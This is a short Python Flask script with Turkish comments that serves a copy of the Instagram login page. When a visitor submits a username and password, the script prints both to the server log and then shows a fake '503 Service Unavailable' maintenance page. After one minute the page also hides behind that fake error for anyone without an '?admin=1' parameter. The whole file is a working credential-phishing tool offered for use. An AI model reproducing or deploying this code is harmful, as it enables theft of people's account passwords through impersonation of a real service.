import os
import time
from flask import Flask, request, render_template_string

app = Flask(__name__)
START_TIME = time.time()

# --- INSTAGRAM TASARIMI (GÜVENLİ LOGO LİNKİ) ---
HTML_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        /* Logo için alternatif güvenli link */
        .logo { width: 175px; margin-bottom: 20px; content: url("https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"); }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo"></div>
        <form method="POST" action="/login">
            <input type="text" name="u" placeholder="Kullanıcı adı" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

HATA_EKRANI = """<h1 style='text-align:center;margin-top:100px;font-family:sans-serif;'>503 Service Unavailable</h1><p style='text-align:center;'>Sunucu bakimda, lutfen sonra deneyin.</p>"""

@app.route('/')
def home():
    is_admin = request.args.get('admin') == '1'
    gecen_sure = time.time() - START_TIME
    
    if gecen_sure > 60 and not is_admin:
        return HATA_EKRANI, 503
        
    return render_template_string(HTML_KODU)

@app.route('/login', methods=['POST'])
def login():
    print(f"--- VERI --- User: {request.form.get('u')} | Pass: {request.form.get('p')}")
    return HATA_EKRANI, 503

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
